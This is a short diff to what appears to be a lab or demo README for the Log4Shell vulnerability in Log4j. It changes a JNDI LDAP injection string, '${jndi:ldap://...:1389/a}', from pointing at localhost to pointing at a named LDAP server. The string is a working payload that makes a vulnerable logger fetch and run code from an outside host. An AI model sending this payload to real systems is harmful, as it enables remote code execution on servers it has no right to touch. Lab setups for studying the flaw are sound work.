@@ -1,4 +1,4 @@
-${jndi:ldap://localhost:1389/a}
+Use `${jndi:ldap://snoopy-ldap-server:1389/a}` 
 
 Dependencies : 
 
